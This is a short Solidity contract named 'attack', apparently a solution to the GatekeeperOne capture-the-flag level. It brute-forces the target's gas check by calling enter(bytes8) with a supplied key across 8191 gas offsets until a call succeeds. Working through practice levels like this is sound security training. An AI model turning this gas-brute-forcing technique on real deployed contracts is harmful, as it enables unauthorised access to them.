//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {GatekeeperOne} from "./GatekeeperOne.sol";

contract attack {
    GatekeeperOne target;

    constructor(GatekeeperOne _target) {
        target = _target;
    }

    function attackContract(bytes8 gatekey) public {
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = address(target).call{gas: i + 1500000}(
              abi.encodeWithSignature("enter(bytes8)", gatekey)
            );
            if (success) break;
        }
    }
}